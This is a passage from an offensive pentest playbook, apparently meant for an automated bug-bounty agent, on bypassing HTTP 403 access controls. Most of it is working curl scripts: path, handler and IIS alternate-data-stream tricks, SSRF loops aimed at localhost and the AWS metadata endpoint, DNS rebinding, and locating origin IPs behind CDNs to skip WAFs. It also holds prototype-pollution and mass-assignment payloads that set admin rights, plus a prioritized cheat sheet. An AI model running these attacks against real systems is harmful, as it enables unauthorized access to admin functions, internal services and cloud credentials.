curl -sk "$TARGET/$PROTECTED?foo" -o /tmp/qbp2.txt -w "%{http_code} | ? with dummy param\n"

# Filename confusion - DocumentRoot escape
# ACL blocks /var/www/html/admin.php
# Confusion: /uploads/../admin.php -> resolved differently by auth vs proxy
curl -sk --path-as-is "$TARGET/uploads/../$PROTECTED" -o /dev/null -w "%{http_code} | DocumentRoot confusion\n"
curl -sk --path-as-is "$TARGET/static/../../$PROTECTED" -o /dev/null -w "%{http_code} | parent dir escape\n"

# Handler confusion - expose .php source via AddType quirk
# If Apache has AddHandler or SetHandler for .php but mod_php quirks exist
curl -sk "$TARGET/$PROTECTED/." -o /dev/null -w "%{http_code} | handler confusion trailing dot\n"
curl -sk "$TARGET/allowed.php/$PROTECTED" -o /dev/null -w "%{http_code} | PATH_INFO handler confusion\n"

# XSS -> RCE via legacy SSI (1996 code path still present)
# If mod_include active and .shtml served:
curl -sk "$TARGET/page.shtml" | grep -i "<!--#" && \
  echo "[!] SSI active - check for RCE via include directive"

echo "[*] Compare response size vs 403: baseline was $(curl -sk "$TARGET/$PROTECTED" | wc -c) bytes"
```

**Detection:** If `?` bypass works (response != 403 and body contains PHP output rather than source), it's a confirmed auth bypass. Impact = same access as if authenticated to the PHP endpoint.

---

## Step 16: DNS Rebinding + SSRF Chain (Phantom Pivot)

**Source:** "The Phantom Pivot" research - TOCTOU in DNS validation to reach internal 403-protected endpoints.

The application resolves your domain to a safe IP (passes the check), then you flip the DNS to an internal IP before the actual connection is made:

```bash
# Phase 1: Register a domain you control with ultra-low TTL (1 second)
# Use rbndr.us (free DNS rebinding service) or Singularity of Origin framework

# Pattern: app resolves attacker.com -> 1.2.3.4 (safe, passes check)
# Then: DNS TTL expires, rebind attacker.com -> 192.168.1.1 (internal)
# Result: app connects to 192.168.1.1 using attacker's path

# Tools for DNS rebinding attacks:
# - rbndr.us: Use <public-ip>.<internal-ip>.rbndr.us
# - Singularity of Origin: https://github.com/nccgroup/singularity
# - DNSrebinder: https://github.com/iphelix/dnschef

# SSRF -> internal 403 bypass chain
# Step 1: Find SSRF endpoint (URL parameter, image fetch, webhook, etc.)
curl -sk "https://target.com/fetch?url=http://127.0.0.1:8080/admin" \
  -w "%{http_code} | SSRF to internal admin\n"

# Step 2: Try localhost variants to bypass SSRF filters
LOCALHOST_VARIANTS=(
  "http://127.0.0.1/admin"
  "http://localhost/admin"
  "http://localhost./admin"    # trailing dot bypasses many filters
  "http://[::1]/admin"         # IPv6 localhost
  "http://0.0.0.0/admin"
  "http://0177.0.0.1/admin"    # octal
  "http://2130706433/admin"    # decimal IP
  "http://127.1/admin"         # short form
  "http://127.0.0.1:80/admin"
  "http://169.254.169.254/latest/meta-data/"  # AWS metadata
)

for URL in "${LOCALHOST_VARIANTS[@]}"; do
  CODE=$(curl -sk "https://target.com/fetch?url=$URL" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" && "$CODE" != "400" ]] && echo "[!] HIT: $CODE | $URL" || echo "[ ] $CODE | $URL"
done
```

---

## Step 17: Cloud-Specific 403 Bypasses

### AWS ALB - Direct Access Bypass

AWS Application Load Balancers behind API Gateway often have the ALB publicly accessible - API Gateway ACLs can be bypassed by hitting the ALB directly:

```bash
# Discover the ALB domain (often findable via Certificate Transparency / DNS)
# Format: xxx.region.elb.amazonaws.com
ALB="your-alb-123456.us-east-1.elb.amazonaws.com"
TARGET_DOMAIN="api.target.com"

# Hit ALB directly with Host header spoofed to app domain
curl -sk "http://$ALB/admin" -H "Host: $TARGET_DOMAIN" -w "%{http_code} | ALB direct bypass\n"

# AWS WAF bypass via custom header not checked by WAF but trusted by app
curl -sk "https://target.com/admin" \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Amz-Cf-Id: bypass" \
  -w "%{http_code}\n"
```

### Cloudflare - Origin IP Discovery + Direct Access

```bash
# If you find the origin IP (via Shodan, Censys, historical DNS, CT logs)
# Hit origin directly - Cloudflare WAF/ACL not in path
ORIGIN_IP="1.2.3.4"
TARGET_DOMAIN="target.com"

curl -sk "https://$ORIGIN_IP/admin" \
  -H "Host: $TARGET_DOMAIN" \
  --insecure \
  -w "%{http_code} | Cloudflare bypass via origin IP\n"

# Also test Cloudflare Workers bypass via range headers
curl -sk "https://target.com/restricted" \
  -H "Range: bytes=0-" \
  -w "%{http_code} | Range header bypass\n"
```

### BreakingWAF - CDN/WAF Origin IP Direct Bypass (Zafran, December 2024)

**Source:** Zafran Research Team, December 2024. Affects Akamai, Cloudflare, Fastly, Imperva. Impacted ~40% of Fortune 100 companies.

CDN/WAF providers act as both WAF AND CDN. If the backend origin IP is directly reachable on the internet (misconfiguration = no IP whitelist on the origin), an attacker bypasses ALL WAF/ACL/auth by hitting the origin directly. The WAF's 403 rules never fire:

```bash
TARGET_DOMAIN="target.com"
RESULTS_DIR="/tmp/breakingwaf"
mkdir -p $RESULTS_DIR

# Step 1: Find the origin IP behind the CDN
# Method A: Shodan SSL cert mining (most reliable)
ORIGIN_IPS=$(shodan search "ssl.cert.subject.cn:$TARGET_DOMAIN" --fields ip_str --limit 100 2>/dev/null)

# Method B: Historical DNS (origin may have had A record before CDN)
HIST_IPS=$(curl -s "https://api.securitytrails.com/v1/history/$TARGET_DOMAIN/dns/a" \
  -H "apikey: $SECURITYTRAILS_KEY" 2>/dev/null | jq -r '.records[].values[].ip' | sort -u)

# Method C: Censys cert search
CENSYS_IPS=$(censys search "parsed.names: $TARGET_DOMAIN" --fields ip 2>/dev/null | awk '{print $1}')

# Method D: Zone transfer / passive DNS / CT log IP lookup
# (Combine all sources)
ALL_IPS=$(echo -e "$ORIGIN_IPS\n$HIST_IPS\n$CENSYS_IPS" | sort -u | grep -v "^$")

echo "[*] Candidate origin IPs:"
echo "$ALL_IPS"

# Step 2: Test direct access to origin IP (bypasses CDN/WAF entirely)
echo "$ALL_IPS" | while read IP; do
  # Test with Host header spoofed to the protected domain
  CODE=$(curl -sk "https://$IP/admin" -H "Host: $TARGET_DOMAIN" \
    --connect-timeout 5 --insecure -o /dev/null -w "%{http_code}" 2>/dev/null)
  [[ "$CODE" != "000" && "$CODE" != "403" ]] && \
    echo "[!] BREAKINGWAF HIT: $IP returns $CODE for /admin (WAF bypassed)" | tee -a $RESULTS_DIR/hits.txt || \
    echo "[ ] $IP: $CODE"
done

# Step 3: If origin responds, test all protected endpoints against it directly
ORIGIN_IP="x.x.x.x"  # replace with confirmed origin
for ENDPOINT in /admin /api/internal /dashboard /api/v1/users; do
  CODE=$(curl -sk "https://$ORIGIN_IP$ENDPOINT" \
    -H "Host: $TARGET_DOMAIN" --insecure -o /dev/null -w "%{http_code}")
  echo "$CODE | $ENDPOINT via origin $ORIGIN_IP"
done
```

**Why this works:** CDN/WAF sees traffic through CDN nodes only. If origin has no IP allowlist, attackers route around the CDN entirely. All WAF rules, rate limiting, auth checks, and 403 responses live in the CDN - origin serves everything unconditionally.

### API Versioning Bypass

Older API versions may lack the same ACLs:

```bash
TARGET="https://target.com"
ENDPOINT="admin/users"

for VER in "" v1 v2 v3 v4 v0 api api/v1 api/v2 api/v3 internal; do
  URL="$TARGET/$VER/$ENDPOINT"
  CODE=$(curl -sk "$URL" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" && "$CODE" != "404" ]] && echo "[!] HIT: $CODE | $URL" || echo "[ ] $CODE | $URL"
done
```

---

## Step 18: IIS / Windows-Specific Bypasses

For targets running IIS (detected via `Server: Microsoft-IIS` header):

```bash
TARGET="https://target.com"
RESTRICTED="admin"

# IIS 8.3 Short Name (Tilde) Enumeration - reveals hidden paths + bypasses ACLs
# IIS maps long filenames to 8.3 DOS names - ACL may only protect the long name
for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
  CODE=$(curl -sk "$TARGET/${CHAR}*~1*/.aspx" -o /dev/null -w "%{http_code}")
  [[ "$CODE" == "404" ]] && echo "[ ] $CHAR" || echo "[!] EXISTS ($CODE) | ${CHAR}*~1*/.aspx"
done

# IIS Alternate Data Streams - Windows NTFS feature, bypasses path-based ACLs
# ::$Index_Allocation - bypasses folder access restriction
curl -sk "$TARGET/$RESTRICTED::$Index_Allocation" -o /dev/null -w "%{http_code} | ::Index_Allocation\n"
curl -sk "$TARGET/$RESTRICTED:$I30:$Index_Allocation" -o /dev/null -w "%{http_code} | :I30:Index_Allocation\n"

# ::$DATA - returns raw source of .aspx/.php files (bypasses execution, returns code)
curl -sk "$TARGET/admin.aspx::DATA" -o /dev/null -w "%{http_code} | ::DATA source bypass\n"

# Windows path separator abuse - IIS accepts backslash
curl -sk "$TARGET\\$RESTRICTED" -o /dev/null -w "%{http_code} | backslash separator\n"
curl -sk "$TARGET/$RESTRICTED%5c" -o /dev/null -w "%{http_code} | encoded backslash\n"

# ASP.NET cookieless session trick - injects session into URL path
curl -sk "$TARGET/(S(admin))/$RESTRICTED/" -o /dev/null -w "%{http_code} | ASP.NET cookieless session\n"
curl -sk "$TARGET/(A(admin))/$RESTRICTED/" -o /dev/null -w "%{http_code} | ASP.NET cookieless auth\n"
```

**Tool:** `iis-shortname-scanner` or `tilde_enum` for automated enumeration.

---

## Step 19: Prototype Pollution (Node.js/Express Auth Bypass)

**Source:** PortSwigger Web Security Academy, CVEs in web3-utils, dset, uplot (2024).

Server-side prototype pollution can inject properties into `Object.prototype`, affecting all objects in the process - including those used for authorization checks:

```bash
TARGET="https://target.com/api"

# Inject isAdmin: true into prototype chain via JSON body
# If app does: if (user.isAdmin) { allow() } and isAdmin isn't explicitly set,
# it falls back to prototype - where we injected true
curl -sk -X POST "$TARGET/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass","__proto__":{"isAdmin":true}}' \
  -w "%{http_code} | proto pollution isAdmin\n"

# Via constructor.prototype (alternate path)
curl -sk -X PUT "$TARGET/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":"user","constructor":{"prototype":{"isAdmin":true,"role":"admin"}}}' \
  -w "%{http_code} | constructor.prototype pollution\n"

# Via URL query params (Express query parser flattens these)
curl -sk "$TARGET/admin?__proto__[isAdmin]=true&__proto__[role]=admin" \
  -w "%{http_code} | query param pollution\n"

# Test if pollution persists - send follow-up request without the payload
curl -sk "$TARGET/admin" -w "%{http_code} | persistence check\n"

# Detect with non-destructive probe (look for reflected property change)
curl -sk -X POST "$TARGET/any-json-endpoint" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"testProperty":"polutionWorks"}}' \
  -w "%{http_code} | probe\n"
```

---

## Step 20: Host Header + Absolute URL Tricks

### Absolute URL in Request Line

Some proxies prefer the absolute URL over the Host header when routing - exploit this to reach internal services:

```bash
# Standard: GET /admin HTTP/1.1 + Host: target.com
# Attack:   GET http://internal-service/admin HTTP/1.1 + Host: target.com
# Proxy may route to internal-service while app sees target.com as Host

curl -sk --request-target "http://internal-api.target.com/admin" \
  "https://target.com/admin" \
  -H "Host: target.com" \
  -w "%{http_code} | absolute URL request-target\n"

# Also test with internal service names if known
for HOST in \
  "localhost" \
  "127.0.0.1" \
  "internal" \
  "api.internal" \
  "admin.internal" \
  "backend"
do
  CODE=$(curl -sk "https://target.com/restricted" -H "Host: $HOST" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" && "$CODE" != "400" ]] && echo "[!] HIT: $CODE | Host: $HOST" || echo "[ ] $CODE | Host: $HOST"
done
```

### Port-Based ACL Gaps

The same app or backend may run on different ports with looser ACLs:

```bash
DOMAIN="target.com"
RESTRICTED="/admin"

for PORT in 80 443 8080 8443 8000 8001 8008 8888 9000 9001 9090 9443 3000 4000 5000; do
  SCHEME="http"
  [[ "$PORT" == "443" || "$PORT" == "8443" || "$PORT" == "9443" ]] && SCHEME="https"
  CODE=$(curl -sk "$SCHEME://$DOMAIN:$PORT$RESTRICTED" -o /dev/null -w "%{http_code}" --connect-timeout 3)
  [[ "$CODE" != "403" && "$CODE" != "000" ]] && echo "[!] HIT: $CODE | $SCHEME://$DOMAIN:$PORT$RESTRICTED" || echo "[ ] $CODE | port $PORT"
done
```

### Mass Assignment (Spring / Laravel / Rails)

Frameworks auto-bind request params to model objects - send undocumented fields to escalate privileges:

```bash
TARGET="https://target.com/api/profile/update"

# Try admin privilege fields in JSON body
curl -sk -X PUT "$TARGET" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"name":"user","isAdmin":true,"role":"admin","admin":true,"userType":"ADMIN","privilegeLevel":9}' \
  -w "%{http_code} | mass assignment probe\n"

# Form-encoded variant (Spring MVC autobinding)
curl -sk -X POST "$TARGET" \
  -d "name=user&isAdmin=true&role=admin&admin=1" \
  -w "%{http_code} | Spring autobinding\n"

# Then verify if privilege was granted
curl -sk "https://target.com/api/admin/users" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -w "%{http_code} | verify escalation\n"
```

---

## Step 21: Classify and Document

### Confirmed Bypass
Response code changes from 403 to 200/201/204 AND body contains:
- Sensitive data (PII, credentials, internal data)
- Admin functionality (user list, settings, CRUD operations)
- Content meaningfully different from the 403 body (compare sizes)

### Potential Bypass
Response code changes but body is empty, is a redirect loop, or has same content/size as the 403. Needs manual verification.

### False Positive
Response code changes to non-403 but body size/content is identical to 403 response. The server is masking with a different code.

**Always compare body sizes:** `curl -sk "$BYPASS_URL" | wc -c` vs baseline 403 size.

---

## Step 22: Write Summary

```bash
mkdir -p ~/pentest-toolkit/results/<target>

cat > ~/pentest-toolkit/results/<target>/interesting_403bypass.md << 'EOF'
## 403 Bypass Results - <target>

### Target URL
<url>

### Confirmed Bypasses
| Technique | Class | Payload/Header | Response Code | Body Size | Evidence Snippet |
|-----------|-------|----------------|---------------|-----------|-----------------|
| Hop-by-hop | Header | Connection: X-Auth-Token | 200 | 4821 | {"users": [...]} |

### Potential Bypasses (manual verification needed)
<list>

### Techniques Exhausted (no bypass)
<list>

### Severity Assessment
- Unauth access to admin panel = Critical
- Unauth access to user PII = High
- Unauth access to internal API = High
- Partial information disclosure = Medium

### Recommended Report Title
"403 Bypass via [Technique] on [Endpoint] leads to [Impact]"
EOF
```

---

## Phase-End: Completion Gate

```bash
PENDING_MUST=$(jq '[.scalpel.active_manifest.items[] | select(.priority=="MUST" and .status=="pending")] | length' $SESSION 2>/dev/null || echo 0)
if [ "$PENDING_MUST" -gt 0 ]; then
  echo "=== COMPLETION GATE BLOCKED ==="
  echo "$PENDING_MUST MUST items not completed:"
  jq '.scalpel.active_manifest.items[] | select(.priority=="MUST" and .status=="pending") | "\(.id): \(.tool) on \(.target)"' $SESSION
  echo "Run them now or mark skipped with reason before calling /triage."
fi

PENDING_SHOULD=$(jq '[.scalpel.active_manifest.items[] | select(.priority=="SHOULD" and .status=="pending")] | length' $SESSION 2>/dev/null || echo 0)
[ "$PENDING_SHOULD" -gt 0 ] && echo "WARNING: $PENDING_SHOULD SHOULD items pending (suboptimal but acceptable)"
```

---

## Quick Cheat Sheet: Priority Order

**Layer 1 - Try first (highest hit rate, fastest)**

| Priority | Technique | Source |
|----------|-----------|--------|
| 1 | `X-Forwarded-For: 127.0.0.1` header | Classic |
| 2 | `X-Original-URL: /admin` on root path | Classic |
| 3 | `/admin/.` or `/admin/` or `//admin` | Path manipulation |
| 4 | `Connection: X-Auth-Token` hop-by-hop strip | Nathan Davison |
| 5 | Double URL encoding `%252f` | DEF CON 2024 |
| 6 | POST/PUT instead of GET + method override | Classic |

**Layer 2 - Parser confusion (conference-grade)**

| Priority | Technique | Source |
|----------|-----------|--------|
| 7 | Nginx off-by-slash `/assets../admin` | Orange Tsai BH2018 |
| 8 | Unicode lookalike in path (Cyrillic а) | CVE-2024-43093 class |
| 9 | `/unauth/%2e%2e/admin.php` path confusion | Assetnote CVE-2025-0108 |
| 10 | Apache mod_proxy encoding `/%61dmin` | CVE-2024-38473 |
| 11 | `/admin.css` or `/admin;style.css` cache deception | PortSwigger BH2024 |

**Layer 3 - Protocol/Application layer (advanced, targeted)**

| Priority | Technique | Source |
|----------|-----------|--------|
| 12 | H2C smuggling via Upgrade: h2c | BishopFox/Assetnote |
| 13 | HTTP request smuggling CL.TE / TE.CL | PortSwigger |
| 13b | OPTIONS + Expect:100-continue + obsolete line folding | CVE-2025-32094 (Akamai) |
| 14 | JWT alg:none / RS256->HS256 confusion | CVE-2024-54150 class |
| 14b | JWT whitespace-prefix RSA key confusion | CVE-2026-34950 (fast-jwt) |
| 15 | GraphQL introspection newline / alias bypass | Community research |
| 16 | HTTP parameter pollution (role=user&role=admin) | Classic |
| 17 | Content-Type switching | Classic |
| 17b | JSON body path traversal (WAF skips body) | 2025 technique |
| 18 | API version downgrade (/v0/, /v1/, /internal/) | Classic |
| 19 | DNS rebinding TOCTOU + SSRF chain | Phantom Pivot |
| 20 | Cloud ALB/Cloudflare origin IP direct hit | Infra-specific |
| 20b | BreakingWAF - CDN/WAF misconfiguration origin IP | Zafran Dec 2024 |

**Layer 4 - Platform/framework specific (target-dependent)**

| Priority | Technique | Source |
|----------|-----------|--------|
| 21 | IIS tilde `/*~1*/.aspx` + `::$Index_Allocation` | Windows/IIS |
| 22 | `ASP.NET (S(admin))/path` cookieless session | IIS/ASP.NET |
| 22b | Apache `?` ACL bypass - Files directive confusion | Orange Tsai BH2024 |
| 23 | `__proto__[isAdmin]=true` prototype pollution | Node.js/Express |
| 24 | `isAdmin=true&role=admin` mass assignment | Spring/Rails/Laravel |
| 25 | Absolute URL `GET http://internal/admin` in request line | Proxy routing |
| 26 | Port scan (8080, 8443, 9000...) for alternate ACL | Infra |

**Layer 5 - Automated sweep (catches everything else)**

| Priority | Technique | Source |
|----------|-----------|--------|
| 27 | `nomore403` - 330+ techniques | GitHub |
| 28 | `403-Bypasser` - HTTP/2 + Wayback mining | GitHub |
| 29 | nuclei 403-bypass templates | ProjectDiscovery |

---

## Key Research References

**Parser Logic / Path Confusion**
- [CVE-2025-0108: Nginx/Apache Path Confusion - Assetnote](https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)
- [CVE-2024-38473: Apache mod_proxy Encoding Bypass - NVD](https://nvd.nist.gov/vuln/detail/cve-2024-38473)
- [Confusion Attacks: Apache HTTP Server - Orange Tsai (Black Hat USA 2024)](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [Breaking Parser Logic - Orange Tsai Black Hat 2018 (PDF)](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
- [Nginx Off-By-Slash Alias - Detectify Research](https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)

**Protocol-Level**
- [H2C Smuggling - BishopFox](https://bishopfox.com/blog/h2c-smuggling-request)
- [H2C Smuggling in the Wild - Assetnote](https://www.assetnote.io/resources/research/h2c-smuggling-in-the-wild)
- [HTTP Request Smuggling - PortSwigger Web Security Academy](https://portswigger.net/web-security/request-smuggling)
- [CVE-2024-6827: Gunicorn TE.CL Smuggling](https://www.miggo.io/vulnerability-database/cve/CVE-2024-6827)
- [CVE-2025-32094: Akamai Ghost - OPTIONS + Obsolete Line Folding Smuggling](https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling)

**CDN/WAF Bypass**
- [BreakingWAF: CDN/WAF Misconfiguration Bypass - Zafran Research (Dec 2024)](https://www.zafran.io/resources/breaking-waf)
- [BreakingWAF Technical Analysis - Zafran](https://www.zafran.io/resources/breaking-waf-technical-analysis)
- [Cloudflare Bypass via Exposed Origin IP - Shodan Recon](https://medium.com/@terp0x0/cloudflare-bypass-via-exposed-origin-ip-the-power-of-shodan-recon-fb7a8cef8ce6)

**Caching**
- [Gotta Cache 'em All - PortSwigger Black Hat/DEF CON 2024](https://portswigger.net/research/gotta-cache-em-all)
- [Web Cache Entanglement: Novel Pathways to Poisoning - PortSwigger (Sep 2025)](https://portswigger.net/research/web-cache-entanglement)
- [Web Cache Deception - Web Security Academy](https://portswigger.net/web-security/web-cache-deception)

**Header Manipulation**
- [Hop-by-Hop Header Abuse - Nathan Davison](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers)
- [Abusing Hop-by-Hop Headers - HackTricks](https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers)

**JWT**
- [CVE-2024-54150: JWT Algorithm Confusion - PentesterLab](https://pentesterlab.com/blog/another-jwt-algorithm-confusion-cve-2024-54150)
- [CVE-2026-34950: fast-jwt Whitespace-Prefix RSA Key Algorithm Confusion (CVSS 9.1)](https://github.com/nearform/fast-jwt/security/advisories/GHSA-mvf2-f6gm-w987)
- [JWT Algorithm Confusion Attacks: Q1 2026 CVE Cluster](https://dev.to/iamdevbox/jwt-algorithm-confusion-attacks-cve-2026-22817-cve-2026-27804-and-cve-2026-23552-fix-guide-4ac4)
- [JWT Vulnerabilities Guide 2025](https://blog.intelligencex.org/jwt-vulnerabilities-testing-guide-2025-algorithm-confusion)

**SSRF / DNS**
- [The Phantom Pivot: SSRF + DNS Rebinding](https://medium.com/@abhinavsharma.cyber/the-phantom-pivot-advanced-red-teaming-through-ssrf-dns-rebinding-by-abhinav-sharma-8b4238f4225f)
- [DNS Rebinding against SSRF Protections](https://behradtaher.dev/DNS-Rebinding-Attacks-Against-SSRF-Protections/)
- [SSRF to RCE via Redis Gopher Protocol](https://medium.com/@zoningxtr/ssrf-to-rce-via-redis-using-gopher-protocol-7409b1d97dcd)

**Tools**
- [nomore403 - DEF CON 2024 double encoding included](https://github.com/devploit/nomore403)
- [403-Bypasser - HTTP/2 native + Wayback mining](https://github.com/benanasutay/403-Bypasser)
- [h2csmuggler - BishopFox](https://github.com/BishopFox/h2csmuggler)
- [gobypass403](https://github.com/slicingmelon/gobypass403)
- [HackTricks 403/401 Bypasses](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)
